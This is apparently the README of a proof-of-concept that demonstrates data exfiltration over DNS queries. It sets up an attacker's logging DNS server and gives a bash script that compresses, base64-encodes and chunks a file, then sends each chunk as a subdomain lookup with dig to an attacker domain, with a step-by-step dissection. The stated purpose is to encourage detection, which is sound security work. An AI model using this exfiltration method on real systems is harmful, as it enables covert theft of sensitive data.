# Introduction

This code was a PoC code to demonstrate how data (textual or binary) can be exfiltrated from a victim over DNS queries. This attack relies on the fact that DNS queries are generally not blocked or monitored for exfiltration.

The threat detection engines of the major cloud providers MUST have detections for exfiltration over DNS. I have validated this in the AWS GuardDuty. Azure, other clouds and on-premises Threat Detection services needs to be validated. Please comment onthe products that have this and I will merge them to this README.

# Setup
## Attacker side
### Theory of the Attacker side [TL;DR]
The attacker needs to firstly run a "customised" DNS server that logs all DNS resolution requests that come to it. 

The attacker registers a domain name  - e.g. example[.]com for DNS queries to come to the server across the Internet and run this DNS server. Once the attacker has a foothold on the victim computer, he sends DNS queries to this DNS server with the exfiltrated data as the subdomain name needing DNS resolution.

### Running the DNS server
The attacker side uses the Twisted module of Python to instantiate a DNS server. For the PoC, the server runs on the localhost on port 10053 (both TCP and UDP).

1. Open a Terminal and navigate to the `attacker` directory.
2. For the first time only, run `pip3 install`. The dependencies will get installed from the requirements.txt file.
3. Run the DNS server - `python3 dns-server.py`
4. **Do not run in background** as the server is configured to log to standard output. However, the POC is configured to extract the `servername` part of the DNS query and reconstruct it. This is the exfiltrated data chunk.

## Victim side
### Theory of the Victim side [TL;DR]
The victim side is the machine from which the attacker wants to exfiltrate sensitive data over DNS queries. This data can be textual or binary and therefore the data is encoded to base64 before creating the DNS queries.

Also as per the RFC-1034, DNS query can by 63 bytes at most including the FQDN (Fully Qualified Domain name). We have taken arbitrarily 35 bytes in our PoC but this number can be altered to fit each query to be 63 bytes.

For the purpose of the PoC, we will create a file that creates a file with "FooBar!" as the text ten thousand times. This is meant to act as the sensitive that will be exfiltrated. In an actual attack, the file will be replaced with the file that contains the sensitive data. This file is created using the Python file `create-file-to-exfil.py`. 

The actual exfiltration is done using the `exfil.sh`

### Running the Victim side code - The data exfiltration
The victim side is demonstrated in Bash under the assumption that the machines containing sensitive data is running some form of Linux/Unix server. Using Python of something means that the attacker might need to 'code' this on the server. On the contrary, Bash is -  *essentially, a few commands thrown in together*.

1. Open a terminal and navigate to the `victim` directory
2. Run the exfil script - `bash exfil.sh`

> In an odd case, some of the utilities may not exist and you can either install the tools or replace with the ones that exist on the system.

## Dissection of the exfil.sh file

```
python3 create-file-to-exfil.py
tar -czf pass.tar.gz an-ip-file.txt
base64 -i pass.tar.gz > encoded
split -b 35 encoded xaa
for i in $(ls xaa*);do DATA=$(base64 -i $i | tr -d "="); dig -p 10053 @localhost $DATA.example.org +short
```

1. The first command creates the file that will be exfiltrated.
2. The file is compressed to save the amount of data that needs to be sent
3. After the compression, even textual data needs to be treated as binary data. The base64 operation converts this binary data to its UTF-8 representation. The encoded  file is sent to a file called `encoded`
4. The file is split into chunks of 35 bytes each stored in a file that has `xaaa` as a prefix. The command line creates as many files as needed for the encoded file to be chunked in to 35 bytes.
5. We iterate through each file and exfiltrate its contents using the `dig` (DNS lookup) command. We will elaborate this chunk as follows

    ```
    for i in $(ls xaa*);
    do 
        DATA=$(base64 -i $i | tr -d "="); 
        dig -p 10053 @localhost $DATA.example.org +short
    done
    ```
    i. The directory where the chunked data lies is listed for the file prefix.

    ii. For each of the file that is returned in the previous command, we base64 encode the chunk and remove the trailing '=' signs that cannot be sent over the DNS queries.
    > We strictly do not need to encode each file but the last file only as that is the only one that contains the padding. However, it is easy to encode each chunk and decode it as opposed to adding logic to detect the last file in the listing.
    
    iii. Since the default output of the base64 operation is to output to standard output, we capture this to a variable called DATA.

    iv. Finally, we create the DNS queries using the `dig` utility. Since we want the queries to go to a specific DNS server on a particular port, we need to add the `-p` argument for post and the `@<hostname>` argument for the DNS server that the request must go to. The *FQDN* part contains the DATA chunk along with the attacker domain.

    > In the real-world the command will not be so complicated and just a `dig $DATA.example.org` will do the trick. The chunk will be sent over.

# Reconstruction of the file at the attacker side
Since we are doing base64 encoding twice - once for the entire file and once for each chunk. When reconstructing the file, each chunk must be base64 decoded. This is achieved in the `dns-server.py` file, where the comment `#Try base64 decoding it till successful` is added.

The output of the successful decoding of the chunk is then appended to the resonstruction file.

Since we are looping at the client side, we will continue to add the base64 decoded chunk to rebuild the original encoded file.

The `reconstruct-the-exfil-file.sh` file contains the command to base64 decode the reconstructed file and then un-gunzip it to get the original file back.

Compare the 2 files by running the command `diff ../victim/an-ip-file.txt an-ip-file.txt` from a terminal window in the `attacker` directory. This should result in a null output.

# Improvements
The solution is a PoC and therefore, we have not added intelligence to detect two separate exfiltration attempts which must be reconstructed as 2 files in the server side. In the current implemnentation, if two separate file are exfiltrated the reconstruction file will be a single file and thereefore reconstruction will fail.

Therefore, for the PoC, you must delete the reconstruction file for each separate demo.
